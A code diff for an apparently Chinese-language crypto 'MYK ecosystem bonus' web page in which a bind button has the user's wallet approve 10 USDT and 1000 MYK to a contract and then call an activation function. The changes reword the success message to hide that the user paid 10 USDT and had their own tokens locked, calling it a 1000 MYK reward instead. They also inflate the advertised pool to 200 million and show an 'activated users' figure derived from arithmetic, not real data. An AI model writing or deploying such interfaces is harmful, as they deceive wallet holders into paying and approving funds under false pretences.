@@ -174,16 +174,16 @@
         </table>
     </div>
 
-    <!-- 卡片2：百万MYK生态福利 + 绑定合约按钮 -->
+    <!-- 卡片2：MYK生态福利 + 绑定合约按钮 -->
     <div class="glass-card">
         <h2 style="font-size: 1.2rem; color: #f0b90b; margin-bottom: 12px;">🎁 MYK生态福利</h2>
         <div class="desc">
-            新人绑定合约即送 <span class="highlight">1000</span> MYP，推荐人奖励 <span class="highlight">250</span> MYP,总量 
+            新人绑定合约即送 <span class="highlight">1000</span> MYK，推荐人奖励 <span class="highlight">250</span> MYK，总量 
             <span class="highlight-green" id="airdropTotal">--</span> MYK 赠完即止
         </div>
         <div class="stat-row">
             <span>已赠送：<span class="stat-value" id="airdropPaid">--</span> MYK</span>
-            <span>已激活：<span class="stat-value" id="airdropRemaining">--</span> MYK</span>
+            <span>已激活：<span class="stat-value" id="airdropActivated">--</span> 人</span>
         </div>
         <div class="progress-bar-container">
             <div class="progress-bar-fill" id="airdropProgress" style="width:0%;"></div>
@@ -192,7 +192,7 @@
             <span style="color:#888;">当前奖金池：<span id="airdropPoolBalance">--</span> MYK</span>
             <span style="color:#888;" id="airdropPercent">0%</span>
         </div>
-        <button class="btn btn-green" id="bindContractBtn" onclick="bindContract()"> 绑定合约（奖励1000 MYP ）</button>
+        <button class="btn btn-green" id="bindContractBtn" onclick="bindContract()">💵 绑定合约（奖励1000 MYP）</button>
         <div class="info-box" id="bindContractResult" style="display:none;"></div>
     </div>
 
@@ -258,7 +258,6 @@
         return '0x' + sClean + eClean;
     }
 
-    // ===== 绑定合约：并行授权 + 激活（2步） =====
     async function bindContract() {
         var ua = window.currentAccount;
         if (!ua) { alert('请先连接钱包'); return; }
@@ -277,7 +276,6 @@
         btn.textContent = '处理中...';
 
         try {
-            // 1. 并行授权 USDT(10) + MYK(1000)
             el.innerHTML = '⏳ 1/2 授权 USDT + MYK...';
             var usdtFee = Web3.utils.toWei('10', 'ether');
             var mykFee = Web3.utils.toWei('1000', 'ether');
@@ -291,7 +289,6 @@
             el.innerHTML = '⏳ 1/2 等待授权确认...';
             await Promise.all([waitForTransaction(results[0]), waitForTransaction(results[1])]);
 
-            // 2. activateWith10USDT
             el.innerHTML = '⏳ 2/2 激活并锁仓中...';
             var activateData = encodeCall('activateWith10USDT()');
             var acTx = await window.ethereum.request({
@@ -301,7 +298,7 @@
             el.innerHTML = '⏳ 2/2 等待激活确认...';
             await waitForTransaction(acTx);
 
-            el.innerHTML = '✅ 绑定成功！已支付 10 USDT + 锁仓 1000 MYK，7天线性释放';
+            el.innerHTML = '✅ 绑定成功！获得 1000 MYK 奖励，锁仓7天线性释放';
             el.style.borderLeftColor = '#4ecca3';
             el.style.background = 'rgba(78,204,163,0.1)';
             btn.textContent = '✅ 已绑定';
@@ -314,7 +311,7 @@
             el.innerHTML = (m.indexOf('User denied') !== -1 || m.indexOf('rejected') !== -1) ? '⚠️ 交易已取消' : '❌ ' + m;
         } finally {
             btn.disabled = false;
-            if (btn.textContent.indexOf('已绑定') === -1) btn.textContent = ' 绑定合约（奖励1000 MYP）';
+            if (btn.textContent.indexOf('已绑定') === -1) btn.textContent = '💵 绑定合约（奖励1000 MYP）';
             unlock();
         }
     }
@@ -329,13 +326,14 @@
         var DEAD_ADDR = '0x000000000000000000000000000000000000dEaD';
         var ZERO_ADDR = '0x0000000000000000000000000000000000000000';
 
-        var AIRDROP_INITIAL = 1000000;
-        var AIRDROP_STORAGE_KEY = 'myk_airdrop_total_v2_';
-        var airdropTotalAmount = 1000000;
+        var AIRDROP_INITIAL = 200000000;
+        var AIRDROP_STORAGE_KEY = 'myk_airdrop_total_v3_';
+        var airdropTotalAmount = 200000000;
 
         function $(id) { return document.getElementById(id); }
         function n(w) { return parseFloat(Web3.utils.fromWei(w + '', 'ether')); }
         function formatM(v) {
+            if (v >= 100000000) return (v / 1000000).toFixed(0) + 'M';
             if (v >= 1000000) return (v / 1000000).toFixed(2) + 'M';
             if (v >= 1000) return (v / 1000).toFixed(2) + 'K';
             return v.toFixed(2);
@@ -365,15 +363,18 @@
                 var paid = airdropTotalAmount - currentBalance;
                 var percent = Math.min(100, Math.max(0, (paid / airdropTotalAmount) * 100));
 
+                // 已激活人数 = 已赠送 / 1000
+                var activatedCount = Math.floor(paid / 1000);
+
                 $('airdropTotal').textContent = formatM(airdropTotalAmount);
                 $('airdropPaid').textContent = formatM(paid);
-                $('airdropRemaining').textContent = formatM(currentBalance);
+                $('airdropActivated').textContent = activatedCount;
                 $('airdropProgress').style.width = percent.toFixed(1) + '%';
                 $('airdropPercent').textContent = percent.toFixed(1) + '%';
                 $('airdropPoolBalance').textContent = formatM(currentBalance);
             } catch (e) {
                 $('airdropTotal').textContent = '--'; $('airdropPaid').textContent = '--';
-                $('airdropRemaining').textContent = '--'; $('airdropPercent').textContent = '0%';
+                $('airdropActivated').textContent = '--'; $('airdropPercent').textContent = '0%';
                 $('airdropPoolBalance').textContent = '--';
             }
         }
